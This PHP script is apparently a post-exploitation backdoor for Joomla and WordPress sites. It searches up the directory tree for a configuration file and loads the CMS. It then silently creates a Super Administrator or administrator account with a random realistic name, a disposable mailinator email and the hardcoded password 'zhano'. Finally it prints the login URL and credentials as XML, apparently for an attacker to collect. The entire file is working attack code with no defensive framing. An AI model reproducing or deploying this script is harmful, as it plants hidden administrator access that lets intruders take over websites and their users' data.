<?php
define('MAX_ITERATIONS', 10);
$counter = 0;
$platform = null;

$logins = array(
	'lean',
	'shari',
	'gaynell',
	'ulrike',
	'florentino',
	'sadye',
	'agnus',
	'meri',
	'claudia',
	'valorie',
	'ara',
	'farrah',
	'corina',
	'evelia',
	'ayanna',
	'veronique',
	'kathryn',
	'bailey',
	'stacy',
	'quentin'
);

$full_names = array(
	'Booker Bundrick',
	'Viviana Vansant',
	'Illa Ingalls',
	'Ashley Antunez',
	'Beatriz Bettinger',
	'Santa Soukup',
	'Jesusita Jim',
	'Raleigh Rausch',
	'Charlena Catto',
	'Alina Anton',
	'Tabatha Tekulve',
	'Cherly Colwell',
	'Normand Natal',
	'Laurice Laman',
	'Bambi Brogan',
	'September Simonds',
	'Janna July',
	'Genevive Gross',
	'Adrianne Argento',
	'Minta Mcculler'
);

while(true) {
	if(file_exists('configuration.php')) {
		$platform = 'joomla';
		break;
	}
	if(file_exists('wp-config.php')) {
		$platform = 'wp';
		break;
	}
	chdir('..');
	$counter++;
	if($counter > MAX_ITERATIONS) {
		break;
	}
}

if($platform == 'joomla') {
	define('_JEXEC', 1);
	define('DS', '/');
	define('JPATH_BASE', getcwd());
	
	require_once ( JPATH_BASE . '/includes' . DS . 'defines.php' );
	require_once ( JPATH_BASE . '/includes' . DS . 'framework.php' );
	
	define('JPATH_COMPONENT_ADMINISTRATOR', JPATH_BASE . DS . 'administrator' . DS . 'components' . DS . 'com_content');
	
	$app = JFactory::getApplication('site', array('session' => false));
	$app->initialise();
	
	$acl =& JFactory::getACL();
	 
	jimport('joomla.application.component.helper'); // include libraries/application/component/helper.php
	$usersParams = &JComponentHelper::getParams( 'com_users' ); // load the Params
	 
	// "generate" a new JUser Object
	$user = JFactory::getUser(0); // it's important to set the "0" otherwise your admin user information will be loaded
	 
	$data = array(); // array for all user settings
	
	$usertype = 'Super Administrator';
	 
	// set up the "main" user information
	
	$data['name'] = $full_names[array_rand($full_names)]; // add first- and lastname
	$data['username'] = $logins[array_rand($logins)]. rand(1, 100); // add username
	$data['email'] = $logins[array_rand($logins)] . rand(1000,999999) . '@mailinator.com'; // add email
	$data['groups'] = array('7');
	 
	/* no need to add the usertype, it will be generated automaticaly from the gid */
	 
	$data['password'] = 'zhano'; // set the password
	$data['password2'] = 'zhano'; // confirm the password
	$data['sendEmail'] = 1; // should the user receive system mails?
	 
	/* Now we can decide, if the user will need an activation */
	$data['block'] = 0; // don't block the user
	 
	$base_url = ($_SERVER['HTTPS'] ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'];
	 
	if(is_object($user)) {
		if (!$user->bind($data)) { // now bind the data to the JUser Object, if it not works....
			print $user->getError(); // ...raise an Warning
			exit;
		}
		 
		if (!$user->save()) { // if the user is NOT saved...
			print $user->getError(); // ...raise an Warning
			exit;
		}
		
		print "<?xml version='1.0'?>\n";
		print "<response><user>{$user->username}</user><login>{$base_url}/administrator/index.php#{$user->username}:zhano</login></response>";
	}
	else {
		$instance = JUser::getInstance();
   
		if (!$instance->bind($data)) {
			print $instance->getError();
			exit;
		}
		
		if (!$instance->save(false)) {
			print $instance->getError();
			exit;
		}
		
		print "<?xml version='1.0'?>\n";
		print "<response><user>{$data['username']}</user><login>{$base_url}/administrator/index.php#{$data['username']}:zhano</login><platform>joomla</platform></response>";
	}
}
elseif($platform == 'wp') {
	require('wp-load.php');
	$user_name = $logins[array_rand($logins)]. rand(1, 100);
	$userdata = array('user_login' => $user_name, 'user_pass' => 'zhano', 'user_email' => $user_name.rand(1,100000).rand(700000,900000).'@mailinator.com', 'role' => 'administrator');
	$user_id = wp_insert_user( $userdata );
	
	print "<?xml version='1.0'?>\n";
	print "<response><user>{$user_name}</user><login>".site_url('/wp-login.php')."#{$user_name}:zhano</login><platform>wordpress</platform></response>";
}